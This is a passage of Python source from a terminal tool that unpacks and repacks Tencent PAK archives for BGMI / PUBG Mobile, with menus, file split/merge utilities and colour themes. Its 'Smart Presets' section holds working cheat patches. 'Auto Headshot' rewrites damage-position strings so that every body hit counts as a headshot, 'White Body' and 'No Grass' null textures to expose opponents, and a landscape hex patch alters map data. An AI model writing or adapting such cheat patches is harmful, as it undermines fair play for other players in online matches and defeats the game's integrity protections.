            f'[bold green][1][/bold green]  UNPACK                 [bold yellow]➛ Take all dats from PAK[/bold yellow]\n'
            f'[bold green][2][/bold green]  REPACK                 [bold yellow]➛ Pack files back into PAK[/bold yellow]\n'
            f'[bold green][3][/bold green]  COMPARE DAT FILES      [bold yellow]➛ Diff and extract changes[/bold yellow]\n'
            f'[bold green][4][/bold green]  SEARCH TEXT IN FILES   [bold yellow]➛ Find text in unpack data[/bold yellow]\n'
            f'[bold green][5][/bold green]  SEARCH FILES BY NAME   [bold yellow]➛ Locate file by name[/bold yellow]\n'
            f'[bold green][6][/bold green]  CLEAR UNPACK DATA      [bold yellow]➛ Delete unpacked output[/bold yellow]\n'
            f'[bold green][7][/bold green]  SINGLE CHUNK UNPACK    [bold yellow]➛ Unpack one file by name[/bold yellow]\n'
            f'[bold green][8][/bold green]  MULTI CHUNK UNPACK     [bold yellow]➛ Unpack multiple files[/bold yellow]'
            f'{extra_lines}\n\n'
            f'[bold red][0][/bold red]  BACK TO MAIN MENU',
            border_style='cyan', padding=(1, 3), box=box.ROUNDED
        )
        console.print(tool_menu_panel)
        console.print()

        try:
            choice = Prompt.ask('[bold yellow]Select option [/bold yellow]', default='', show_default=False)
        except KeyboardInterrupt:
            break

        if choice == '1':
            handle_unpack(folder_type, type_name)
        elif choice == '2':
            repack_menu(folder_type, type_name)
        elif choice == '3':
            fast_compare_and_extract_with_choice(folder_type)
        elif choice == '4':
            search_text_in_files(folder_type, type_name)
        elif choice == '5':
            search_files_by_name(folder_type, type_name)
        elif choice == '6':
            handle_clear_data(folder_type, type_name)
        elif choice == '7':
            unpack_file_blocks_using_filename(folder_type)
        elif choice == '8':
            unpack_multiple_files_by_name(folder_type)
        elif choice == '9' and extra_tools:
            handle_lua_only_unpack(folder_type)
        elif choice == '10' and extra_tools:
            handle_extension_lister(folder_type)
        elif choice == '0':
            break
        else:
            console.print(Panel(
                f'[bold red]❌ Option {choice} is invalid[/]',
                title='[bold red]Error[/]',
                border_style='red', padding=(1, 2), box=box.ROUNDED
            ))
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')



def repack_menu(folder_type: str, type_name: str):
    """VIP Repack mode selector."""
    show_banner()

    console.print(Panel(
        Align.center(Text("📥  REPACK — SELECT MODE", style="bold white")),
        box=box.HEAVY_HEAD,
        border_style="yellow",
        padding=(0, 0),
    ))
    console.print()

    table = Table(
        box=box.SIMPLE_HEAD,
        border_style="yellow",
        header_style="bold yellow",
        padding=(0, 0),
        expand=False,
    )
    table.add_column("  #", style="bold yellow", justify="center", width=4)
    table.add_column("MODE", style="bold white", width=26)
    table.add_column("@Black_Toxic000", style="dim white")

    table.add_row("1", "🔁  NON-CHUNK REPACK","")
    table.add_row("2", "🧩  CHUNK REPACK","")
    table.add_row("3", "💛  NON-CHUNK + CHUNK","")

    console.print(Align.center(table))
    console.print()

    choice = Prompt.ask(
        "[bold yellow]  ▶ Select mode[/bold yellow]",
        choices=["1", "2", "3"],
        console=console,
    )

    if choice == "1":
        handle_repack(folder_type, type_name)
        input("Press Enter to continue...")
        return

    if choice == "2":
        pak_file = select_pak_file(folder_type, f"Chunk Repack — {type_name}")
        if not pak_file:
            return

        pak_file = Path(pak_file)
        edited_folder = BASE_DIR / folder_type / "EDITED"
        if not edited_folder.exists() or not any(edited_folder.rglob("*")):
            console.print(Panel(
                "[bold red]  ✗  EDITED folder is empty![/bold red]\n"
                "  Add your edited files to the EDITED folder first.[/dim]",
                box=box.HEAVY_HEAD, border_style="red", padding=(0, 0),
            ))
            Prompt.ask("  Press Enter...[/dim]", console=console, default="")
            return

        output_pak = BASE_DIR / folder_type / "REPACKED" / f"{pak_file.stem}.pak"
        output_pak.parent.mkdir(exist_ok=True)

        try:
            shutil.copy2(pak_file, output_pak)
            is_od_pack = folder_type == "OD_PAK"
            pak_instance = TencentPakFile(pak_file, is_od=is_od_pack)
            report = RepackReport(pak_name=pak_file.name, out_path=str(output_pak))
            chunk_repack_extracted(pak_instance, edited_folder, output_pak, report=report)
            report.print_report()
        except Exception as e:
            error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
            console.print(Panel(
                f"[bold red]  ✗  Chunk Repack failed[/bold red]\n  {error_msg}[/dim]",
                box=box.HEAVY_HEAD, border_style="red", padding=(0, 0),
            ))

        input("Press Enter to continue...")
        return

    if choice == "3":
        normal_then_chunk_repack(folder_type, type_name)
        return


# ==================== SPLIT & MERGE FILES IN 64KB ====================

CHUNK_64KB = 65536

def split_file_ui(split_dir: Path):
    """Split a file into 64KB chunks."""
    CHUNK_SIZE = 65536
    files = [f for f in split_dir.iterdir() if f.is_file()]
    if not files:
        console.print('[red]❌ No Files Found In Split Folder[/red]')
        Prompt.ask('Press Enter...', default='')
        return
    for i, f in enumerate(files, 1):
        console.print(f'  [{i}] {f.name}')
    try:
        idx = int(Prompt.ask('Select Number')) - 1
        src_file = files[idx]
    except Exception:
        console.print('[red]❌ Invalid Selection[/red]')
        return
    out_dir = split_dir / src_file.stem
    out_dir.mkdir(exist_ok=True)
    console.print(f'\n[yellow]✂ Splitting:[/] {src_file.name}')
    part = 0
    with open(src_file, 'rb') as f:
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
            out_file = out_dir / f'{src_file.stem}_{part}{src_file.suffix}'
            out_file.write_bytes(chunk)
            part += 1
    console.print(Panel(
        f'[bold green]✅ Split Complete[/bold green]\n[white]Chunks:[/] {part}\n[cyan]Output:[/] {out_dir}',
        border_style='green'
    ))
    Prompt.ask('[white]Press Enter to continue...[/white]', default='')


def merge_file_ui(merge_dir: Path):
    """Merge 64KB chunk files back into one file."""
    folders = [d for d in merge_dir.iterdir() if d.is_dir()]
    if not folders:
        console.print('[red]❌ No Chunk Folders In Merge[/red]')
        Prompt.ask('Press Enter...', default='')
        return
    console.print('\n[cyan]Select Folder To Merge[/cyan]')
    for i, d in enumerate(folders, 1):
        console.print(f'  [{i}] {d.name}')
    try:
        idx = int(Prompt.ask('Select Number')) - 1
        src_dir = folders[idx]
    except Exception:
        console.print('[red]❌ Invalid Selection[/red]')
        return
    chunks = sorted(src_dir.iterdir(), key=lambda f: int(f.stem.split('_')[-1]))
    if not chunks:
        console.print('[red]❌ No Chunks Found[/red]')
        return
    out_name = Prompt.ask('Enter Merged File Name (With Extension)')
    if not out_name:
        return
    out_file = merge_dir / out_name
    with open(out_file, 'wb') as out:
        for c in chunks:
            out.write(c.read_bytes())
    console.print(Panel(
        f'[bold green]✅ Merge Completed[/bold green]\nChunks Merged: {len(chunks)}\nOutput: {out_file}',
        border_style='green'
    ))
    Prompt.ask('Press Enter...', default='')


def search_text_in_splitted_files(split_dir: Path):
    """Search for text/hex content inside split chunk files."""
    console.print('[cyan]🔍 Search Text In Splitted Files[/cyan]')
    folders = [d for d in split_dir.iterdir() if d.is_dir()]
    if not folders:
        console.print('[red]❌ No Split Folders Found[/red]')
        Prompt.ask('Press Enter...', default='')
        return
    for i, d in enumerate(folders, 1):
        console.print(f'  [{i}] {d.name}')
    try:
        idx = int(Prompt.ask('Select Number')) - 1
        target_dir = folders[idx]
    except Exception:
        console.print('[red]❌ Invalid Selection[/red]')
        return
    search_text = Prompt.ask('\n[yellow]Enter Text To Search[/yellow]').strip()
    if not search_text:
        console.print('[red]❌ Empty Text[/red]')
        return
    search_bytes = search_text.encode(errors='ignore')
    console.print(f'\n[yellow]🔎 Searching \'{search_text}\' in:[/] {target_dir.name}\n')
    found_files = []
    scanned = 0
    for f in sorted(target_dir.iterdir()):
        if not f.is_file():
            continue
        scanned += 1
        try:
            data = f.read_bytes()
            if search_bytes in data:
                found_files.append(f)
                console.print(f'[green]✔ FOUND:[/] {f.name}')
        except Exception:
            continue
    if not found_files:
        console.print('\n[red]❌ Text not found in any chunk[/red]')
        Prompt.ask('\n[white]Press Enter to continue...[/white]', default='')
    else:
        console.print(f'\n[bold green]✅ Found in {len(found_files)} file(s)[/bold green]')
        console.print(f'[cyan]📊 Scanned Files:[/] {scanned}')
        choice = Prompt.ask('\n[yellow]Do you want to copy found files? (Y/N)[/yellow]', default='N').strip().lower()
        if choice == 'y':
            dest_root = target_dir / search_text
            dest_root.mkdir(parents=True, exist_ok=True)
            for f in found_files:
                try:
                    shutil.copy(f, dest_root / f.name)
                except Exception:
                    pass
            console.print(f'[bold green]📁 Copied {len(found_files)} file(s) to:[/] {dest_root}')
        Prompt.ask('\n[white]Press Enter to continue...[/white]', default='')


def file_split_merge_menu():
    """Split & Merge Files In 64kb — main menu."""
    split_merge_root = BASE_DIR / 'Split_Merge'
    split_dir = split_merge_root / 'Split'
    merge_dir = split_merge_root / 'Merge'
    split_dir.mkdir(parents=True, exist_ok=True)
    merge_dir.mkdir(parents=True, exist_ok=True)

    while True:
        show_banner()
        console.print(Panel(
            f'[bold cyan]✂  SPLIT & MERGE FILES IN 64KB[/bold cyan]\n[cyan]{"─" * 32}[/]\n\n'
            f'[green]Split Dir :[/] [white]{split_dir}[/white]\n'
            f'[green]Merge Dir :[/] [white]{merge_dir}[/white]\n\n'
            f'[bold green][1][/bold green] ✂️  SPLIT FILE          [bold yellow]➛ Split into 64KB chunks[/bold yellow]\n'
            f'[bold green][2][/bold green] 🧩 MERGE CHUNKS        [bold yellow]➛ Merge chunks back[/bold yellow]\n'
            f'[bold green][3][/bold green] 🔎 SEARCH IN CHUNKS    [bold yellow]➛ Search text in split files[/bold yellow]\n\n'
            f'[bold red][0][/bold red] BACK TO MAIN MENU',
            border_style='cyan',
            padding=(1, 3),
            box=box.ROUNDED
        ))
        try:
            choice = Prompt.ask('[bold yellow]Select option [/bold yellow]', default='', show_default=False)
        except KeyboardInterrupt:
            return
        if choice == '1':
            split_file_ui(split_dir)
        elif choice == '2':
            merge_file_ui(merge_dir)
        elif choice == '3':
            search_text_in_splitted_files(split_dir)
        elif choice == '0':
            return


# ==================== SMART PRESETS (AUTO CONFIGURATION) ====================

_SMART_TARGET_FILE_NAME = 'BP_PlayerPawn.uasset'
_SMART_HEADSHOT_TARGETS = [
    b'EAvatarDamagePosition::BigBody',
    b'EAvatarDamagePosition::BigFoot',
    b'EAvatarDamagePosition::BigHand',
    b'EAvatarDamagePosition::BigLimbs',
]
_SMART_HEADSHOT_REPLACE = b'EAvatarDamagePosition::BigHead'


def _smart_is_headshot_applied(data: bytes) -> bool:
    for t in _SMART_HEADSHOT_TARGETS:
        if t in data:
            return False
    return _SMART_HEADSHOT_REPLACE in data


def smart_auto_headshot():
    """Smart Preset: Auto Headshot — patches BP_PlayerPawn.uasset."""
    unpacked_root = BASE_DIR / 'ZSDIC' / 'UNPACKED'
    edited_root   = BASE_DIR / 'ZSDIC' / 'EDITED'
    edited_root.mkdir(parents=True, exist_ok=True)
    console.print(Panel(f'[bold cyan]🎯 Target File[/bold cyan]\n{_SMART_TARGET_FILE_NAME}', border_style='cyan'))
    source_file = None
    source_root = None
    from_edited = False
    for f in edited_root.rglob(_SMART_TARGET_FILE_NAME):
        source_file = f; source_root = edited_root; from_edited = True
        console.print('[yellow]ℹ Using EDITED File[/yellow]')
        break
    if not source_file:
        for f in unpacked_root.rglob(_SMART_TARGET_FILE_NAME):
            source_file = f; source_root = unpacked_root
            console.print('[cyan]ℹ Using UNPACKED File (pak root will be skipped)[/cyan]')
            break
    if not source_file:
        console.print('[red]❌ BP_PlayerPawn.uasset Not Found[/red]')
        return
    data = bytearray(source_file.read_bytes())
    if from_edited and _smart_is_headshot_applied(data):
        console.print(Panel(
            '[bold yellow]⚠ ALREADY HEADSHOT APPLIED[/bold yellow]\nThis File Is Already Fully Converted To Headshot.',
            border_style='yellow'
        ))
        Prompt.ask('Press Enter To Continue', default='')
        return
    modified = False
    with Progress(SpinnerColumn(), TextColumn('[progress.description]{task.description}'), BarColumn(), console=console) as progress:
        task = progress.add_task('[cyan]Applying Headshot Patch...', total=len(_SMART_HEADSHOT_TARGETS))
        for target in _SMART_HEADSHOT_TARGETS:
            start = 0
            while True:
                pos = data.find(target, start)
                if pos == -1:
                    break
                if target.endswith(b'BigLimbs'):
                    data[pos:pos + 30] = _SMART_HEADSHOT_REPLACE
                    data[pos + 30] = 0
                else:
                    data[pos:pos + 30] = _SMART_HEADSHOT_REPLACE
                start = pos + 30
                modified = True
            progress.advance(task)
    if not modified:
        console.print('[yellow]⚠ No Headshot Strings Found[/yellow]')
        return
    if source_root == unpacked_root:
        rel = source_file.relative_to(unpacked_root)
        parts = rel.parts
        relative_path = Path(*parts[1:]) if len(parts) > 1 else Path(*parts)
    else:
        relative_path = source_file.relative_to(edited_root)
    out_path = edited_root / relative_path
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(data)
    console.print(Panel(
        f'[bold green]✅ AUTO HEADSHOT SUCCESS[/bold green]\n\n'
        f'Source: {"EDITED" if from_edited else "UNPACKED (pak root skipped)"}\n'
        f'Structure: Non Chunk\nMode: Non-Chunk Ready',
        border_style='green'
    ))
    Prompt.ask('Press Enter to continue', default='')


_SMART_MAX_DAT_SIZE = 1024

def smart_auto_white_body():
    """Smart Preset: Auto White Body — nulls body texture DAT references."""
    unpacked_root = BASE_DIR / 'ZSDIC' / 'UNPACKED'
    edited_root   = BASE_DIR / 'ZSDIC' / 'EDITED'
    edited_root.mkdir(parents=True, exist_ok=True)
    credit = Prompt.ask('[cyan]Enter Credit Text To Write Inside DATs[/cyan]')
    credit_bytes = credit.encode(errors='ignore')
    matched = 0
    dat_files = [f for f in unpacked_root.rglob('*') if f.is_file()]
    with Progress(SpinnerColumn(), TextColumn('[progress.description]{task.description}'), BarColumn(), console=console) as progress:
        task = progress.add_task('[cyan]Scanning DAT Files For White Body...', total=len(dat_files))
        for file in dat_files:
            progress.advance(task)
            if file.stat().st_size > _SMART_MAX_DAT_SIZE:
                continue
            try:
                data = file.read_bytes()
            except Exception:
                continue
            rel = file.relative_to(unpacked_root)
            parts = rel.parts
            relative_path = Path(*parts[1:]) if len(parts) > 1 else Path(*parts)
            out_path = edited_root / relative_path
            out_path.parent.mkdir(parents=True, exist_ok=True)
            with open(out_path, 'wb') as f:
                f.write(b'\x00\x00\x00\x00\x00\x00\x00\x00' + credit_bytes)
            matched += 1
    console.print(Panel(
        f'[bold green]✅ WHITE BODY COMPLETE[/bold green]\n\n'
        f'DAT Files Matched: {matched}\nStatus: White Body Done\nStructure: Non Chunk',
        border_style='green'
    ))
    Prompt.ask('Press Enter to continue', default='')


_SMART_GRASS_FILES = [
    'Baltic_GrassType02.uasset', 'Baltic_GrassType01.uasset',
    'Savage_GrassType02.uasset', 'Savage_GrassType01.uasset',
    'DihorOtok_GrassType03.uasset', 'DihorOtok_GrassType01.uasset',
    'Forest_GrassType01.uasset', 'Foliage_Grasstype_009.uasset',
]

def smart_auto_no_grass():
    """Smart Preset: Auto No Grass — nulls all grass uasset files."""
    unpacked_root = BASE_DIR / 'ZSDIC' / 'UNPACKED'
    edited_root   = BASE_DIR / 'ZSDIC' / 'EDITED'
    edited_root.mkdir(parents=True, exist_ok=True)
    console.print(Panel('[bold cyan]🌿 GRASS WHITE MODE[/bold cyan]\nAuto detect + null grass uassets', border_style='cyan'))
    credit = Prompt.ask('[cyan]Enter credit text[/cyan]')
    credit_bytes = credit.encode(errors='ignore')
    targets = []
    for name in _SMART_GRASS_FILES:
        for f in edited_root.rglob(name):
            targets.append((f, edited_root))
    for name in _SMART_GRASS_FILES:
        for f in unpacked_root.rglob(name):
            rel = f.relative_to(unpacked_root)
            parts = rel.parts
            rel_clean = Path(*parts[1:]) if len(parts) > 1 else Path(*parts)
            found = any(root == edited_root and t.relative_to(edited_root) == rel_clean for t, root in targets)
            if not found:
                targets.append((f, unpacked_root))
    if not targets:
        console.print('[yellow]⚠ No Grass Files Found[/yellow]')
        return
    with Progress(SpinnerColumn(), TextColumn('[progress.description]{task.description}'), BarColumn(),
                  TextColumn('{task.completed}/{task.total}'), console=console) as progress:
        task = progress.add_task('[green]Processing grass files...', total=len(targets))
        for file, root in targets:
            progress.update(task, description=f'[cyan]{file.name}[/cyan]')
            if root == unpacked_root:
                rel = file.relative_to(unpacked_root)
                parts = rel.parts
                relative_path = Path(*parts[1:]) if len(parts) > 1 else Path(*parts)
            else:
                relative_path = file.relative_to(edited_root)
            out_path = edited_root / relative_path
            out_path.parent.mkdir(parents=True, exist_ok=True)
            with open(out_path, 'wb') as f:
                f.write(b'\x00\x00\x00\x00\x00\x00\x00\x00' + credit_bytes)
            progress.advance(task)
    console.print(Panel(
        f'[bold green]✅ GRASS WHITE COMPLETE[/bold green]\n\n'
        f'Files processed: {len(targets)}\n'
        f'Source: EDITED auto-detect + UNPACKED fallback\n'
        f'Structure: Non Chunk\nMode: Non-Chunk',
        border_style='green'
    ))
    Prompt.ask('Press Enter to continue', default='')


def smart_auto_baltic_patch():
    """Smart Preset: Auto Baltic Patch — hex-replaces EDFFFFFF/CDFFFFFF → 00000000."""
    unpacked_root = BASE_DIR / 'OD_PAK' / 'UNPACKED'
    edited_root   = BASE_DIR / 'OD_PAK' / 'EDITED'
    edited_root.mkdir(parents=True, exist_ok=True)
    TARGET_FILE = 'Master_Baltic_Landscape.uexp'
    HEX_REPLACE = {
        b'\xed\xff\xff\xff': b'\x00\x00\x00\x00',
        b'\xcd\xff\xff\xff': b'\x00\x00\x00\x00',
    }
    console.print(Panel('[bold cyan]🧩 MASTER BALTIC LANDSCAPE PATCH[/bold cyan]\nHex replace EDFFFFFF / CDFFFFFF → 00000000', border_style='cyan'))
    source_file = None
    source_root = None
    from_edited = False
    for f in edited_root.rglob(TARGET_FILE):
        source_file = f; source_root = edited_root; from_edited = True
        console.print('[yellow]ℹ Using EDITED file[/yellow]')
        break
    if not source_file:
        for f in unpacked_root.rglob(TARGET_FILE):
            source_file = f; source_root = unpacked_root
            console.print('[cyan]ℹ Using UNPACKED file[/cyan]')
            break
    if not source_file:
        console.print('[red]❌ Master_Baltic_Landscape.uexp not found[/red]')
        Prompt.ask('[cyan]Press Enter To Continue[/cyan]', default='')
        return
    try:
        data = bytearray(source_file.read_bytes())
    except Exception as e:
        console.print(f'[red]❌ Read error:[/] {e}')
        Prompt.ask('[cyan]Press Enter To Continue[/cyan]', default='')
        return
    already_done = not any(pat in data for pat in HEX_REPLACE)
    if from_edited and already_done:
        console.print(Panel('[bold yellow]⚠ ALREADY PATCHED[/bold yellow]\nHex Values Are Already NULL.', border_style='yellow'))
        Prompt.ask('[cyan]Press Enter To Continue[/cyan]', default='')
        return
    modified = False
    for pat, rep in HEX_REPLACE.items():
        start = 0
        while True:
            idx = data.find(pat, start)
            if idx == -1:
                break
            data[idx:idx + 4] = rep
            start = idx + 4
            modified = True
    if not modified:
        console.print('[yellow]⚠ No Matching Hex Patterns Found[/yellow]')
        Prompt.ask('[cyan]Press Enter To Continue[/cyan]', default='')
        return
    if source_root == unpacked_root:
        rel = source_file.relative_to(unpacked_root)
        parts = rel.parts
        relative_path = Path(*parts[1:]) if len(parts) > 1 else Path(*parts)
    else:
        relative_path = source_file.relative_to(edited_root)
    out_path = edited_root / relative_path
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(data)
    console.print(Panel(
        f'[bold green]✅ PATCH SUCCESSFUL[/bold green]\n\n'
        f'File: {TARGET_FILE}\n'
        f'Source: {"EDITED" if from_edited else "UNPACKED (pak root skipped)"}\n'
        f'Hex: EDFFFFFF / CDFFFFFF → 00000000\nStructure: Non Chunk',
        border_style='green'
    ))
    Prompt.ask('[cyan]Press Enter to continue[/cyan]', default='')


def smart_presets_menu():
    """Smart Presets menu — one-click common mods for BGMI / PUBG."""
    while True:
        show_banner()
        console.print(Panel(
            f'[bold cyan]⚙  SMART PRESETS[/bold cyan]\n[cyan]{"─" * 32}[/]\n\n'
            f'[bold green][1][/bold green] Auto Headshot     [bold yellow]➛ Mini / Zsdic[/bold yellow]\n'
            f'[bold green][2][/bold green] Auto White Body   [bold yellow]➛ Mini / Zsdic[/bold yellow]\n'
            f'[bold green][3][/bold green] Auto No Grass     [bold yellow]➛ Mini / Zsdic[/bold yellow]\n'
            f'[bold green][4][/bold green] Auto Baltic Patch [bold yellow]➛ Base Part 1[/bold yellow]\n\n'
            f'[bold red][0][/bold red] Back to Main Menu',
            border_style='cyan',
            padding=(1, 3),
            box=box.ROUNDED
        ))
        try:
            choice = Prompt.ask('[bold yellow]Select option [/bold yellow]', default='', show_default=False)
        except KeyboardInterrupt:
            return
        if choice == '1':
            smart_auto_headshot()
        elif choice == '2':
            smart_auto_white_body()
        elif choice == '3':
            smart_auto_no_grass()
        elif choice == '4':
            smart_auto_baltic_patch()
        elif choice == '0':
            return


# ==================== THEME COLOR CUSTOMIZER (OPTION 17) ====================

# Theme color presets
THEME_PRESETS = {
    "0": {
        "name": "🔵 Default (Original)",
        "colors": {
            "primary": "cyan",
            "secondary": "green",
            "accent": "yellow",
            "border": "cyan",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim white",
            "panel_border": "cyan",
            "title": "bold cyan",
            "success": "green",
            "error": "red",
            "warning": "yellow",
            "info": "cyan"
        }
    },
    "1": {
        "name": "🌿 Green",
        "colors": {
            "primary": "green",
            "secondary": "bright_green",
            "accent": "green",
            "border": "green",
            "text": "white",
            "highlight": "bright_green",
            "dim": "dim green",
            "panel_border": "green",
            "title": "bold green",
            "success": "bright_green",
            "error": "red",
            "warning": "yellow",
            "info": "cyan"
        }
    },
    "2": {
        "name": "🔥 Red",
        "colors": {
            "primary": "red",
            "secondary": "bright_red",
            "accent": "red",
            "border": "red",
            "text": "white",
            "highlight": "bright_red",
            "dim": "dim red",
            "panel_border": "red",
            "title": "bold red",
            "success": "green",
            "error": "bright_red",
            "warning": "yellow",
            "info": "cyan"
        }
    },
    "3": {
        "name": "⭐ Yellow",
        "colors": {
            "primary": "yellow",
            "secondary": "bright_yellow",
            "accent": "yellow",
            "border": "yellow",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim yellow",
            "panel_border": "yellow",
            "title": "bold yellow",
            "success": "green",
            "error": "red",
            "warning": "bright_yellow",
            "info": "cyan"
        }
    },
    "4": {
        "name": "💙 Blue",
        "colors": {
            "primary": "blue",
            "secondary": "bright_blue",
            "accent": "blue",
            "border": "blue",
            "text": "white",
            "highlight": "bright_blue",
            "dim": "dim blue",
            "panel_border": "blue",
            "title": "bold blue",
            "success": "green",
            "error": "red",
            "warning": "yellow",
            "info": "cyan"
        }
    },
    "5": {
        "name": "💜 Purple",
        "colors": {
            "primary": "magenta",
            "secondary": "bright_magenta",
            "accent": "magenta",
            "border": "magenta",
            "text": "white",
            "highlight": "bright_magenta",
            "dim": "dim magenta",
            "panel_border": "magenta",
            "title": "bold magenta",
            "success": "green",
            "error": "red",
            "warning": "yellow",
            "info": "cyan"
        }
    },
    "6": {
        "name": "🌈 Rambo",
        "colors": {
            "primary": "bright_red",
            "secondary": "bright_yellow",
            "accent": "bright_cyan",
            "border": "bright_magenta",
            "text": "white",
            "highlight": "bright_green",
            "dim": "dim white",
            "panel_border": "bright_magenta",
            "title": "bold bright_cyan",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "7": {
        "name": "🦈 Cyberpunk",
        "colors": {
            "primary": "cyan",
            "secondary": "bright_magenta",
            "accent": "bright_cyan",
            "border": "bright_blue",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim cyan",
            "panel_border": "bright_blue",
            "title": "bold bright_cyan",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "8": {
        "name": "🌙 Dark Knight",
        "colors": {
            "primary": "bright_white",
            "secondary": "bright_black",
            "accent": "bright_blue",
            "border": "bright_white",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim white",
            "panel_border": "bright_white",
            "title": "bold bright_white",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "9": {
        "name": "🌅 Sunset",
        "colors": {
            "primary": "bright_red",
            "secondary": "bright_yellow",
            "accent": "bright_magenta",
            "border": "bright_red",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim red",
            "panel_border": "bright_red",
            "title": "bold bright_red",
            "success": "bright_green",
            "error": "red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "10": {
        "name": "💎 Diamond",
        "colors": {
            "primary": "bright_white",
            "secondary": "bright_cyan",
            "accent": "bright_blue",
            "border": "bright_white",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim white",
            "panel_border": "bright_white",
            "title": "bold bright_white",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "11": {
        "name": "🍀 Emerald",
        "colors": {
            "primary": "bright_green",
            "secondary": "green",
            "accent": "bright_yellow",
            "border": "bright_green",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim green",
            "panel_border": "bright_green",
            "title": "bold bright_green",
            "success": "green",
            "error": "red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "12": {
        "name": "🎃 Halloween",
        "colors": {
            "primary": "bright_yellow",
            "secondary": "bright_red",
            "accent": "bright_magenta",
            "border": "bright_red",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim red",
            "panel_border": "bright_red",
            "title": "bold bright_yellow",
            "success": "bright_green",
            "error": "red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "13": {
        "name": "🌸 Sakura",
        "colors": {
            "primary": "bright_magenta",
            "secondary": "bright_white",
            "accent": "bright_red",
            "border": "bright_magenta",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim magenta",
            "panel_border": "bright_magenta",
            "title": "bold bright_magenta",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "14": {
        "name": "🌊 Ocean",
        "colors": {
            "primary": "bright_blue",
            "secondary": "cyan",
            "accent": "bright_cyan",
            "border": "bright_blue",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim blue",
            "panel_border": "bright_blue",
            "title": "bold bright_blue",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "15": {
        "name": "🌄 Desert",
        "colors": {
            "primary": "bright_yellow",
            "secondary": "yellow",
            "accent": "bright_red",
            "border": "bright_yellow",
            "text": "white",
            "highlight": "bright_white",
            "dim": "dim yellow",
            "panel_border": "bright_yellow",
            "title": "bold bright_yellow",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_white",
            "info": "bright_cyan"
        }
    },
    "16": {
        "name": "🌺 Tropical",
        "colors": {
            "primary": "bright_red",
            "secondary": "bright_yellow",
            "accent": "bright_green",
            "border": "bright_red",
            "text": "white",
            "highlight": "bright_cyan",
            "dim": "dim red",
            "panel_border": "bright_red",
            "title": "bold bright_red",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "17": {
        "name": "❄️ Winter",
        "colors": {
            "primary": "bright_white",
            "secondary": "bright_blue",
            "accent": "cyan",
            "border": "bright_white",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim white",
            "panel_border": "bright_white",
            "title": "bold bright_white",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "18": {
        "name": "🎨 Neon",
        "colors": {
            "primary": "bright_magenta",
            "secondary": "bright_cyan",
            "accent": "bright_yellow",
            "border": "bright_magenta",
            "text": "white",
            "highlight": "bright_cyan",
            "dim": "dim magenta",
            "panel_border": "bright_magenta",
            "title": "bold bright_magenta",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "19": {
        "name": "🍁 Autumn",
        "colors": {
            "primary": "bright_yellow",
            "secondary": "bright_red",
            "accent": "bright_magenta",
            "border": "bright_yellow",
            "text": "white",
            "highlight": "bright_white",
            "dim": "dim yellow",
            "panel_border": "bright_yellow",
            "title": "bold bright_yellow",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_white",
            "info": "bright_cyan"
        }
    },
    "20": {
        "name": "🌌 Galaxy",
        "colors": {
            "primary": "bright_magenta",
            "secondary": "bright_blue",
            "accent": "bright_cyan",
            "border": "bright_blue",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim magenta",
            "panel_border": "bright_blue",
            "title": "bold bright_magenta",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "21": {
        "name": "🍷 Wine",
        "colors": {
            "primary": "bright_red",
            "secondary": "magenta",
            "accent": "bright_magenta",
            "border": "bright_red",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim red",
            "panel_border": "bright_red",
            "title": "bold bright_red",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "22": {
        "name": "💀 Gothic",
        "colors": {
            "primary": "bright_white",
            "secondary": "bright_black",
            "accent": "bright_magenta",
            "border": "bright_white",
            "text": "white",
            "highlight": "bright_red",
            "dim": "dim white",
            "panel_border": "bright_white",
            "title": "bold bright_white",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "23": {
        "name": "🏝️ Paradise",
        "colors": {
            "primary": "bright_green",
            "secondary": "bright_blue",
            "accent": "bright_yellow",
            "border": "bright_green",
            "text": "white",
            "highlight": "bright_cyan",
            "dim": "dim green",
            "panel_border": "bright_green",
            "title": "bold bright_green",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
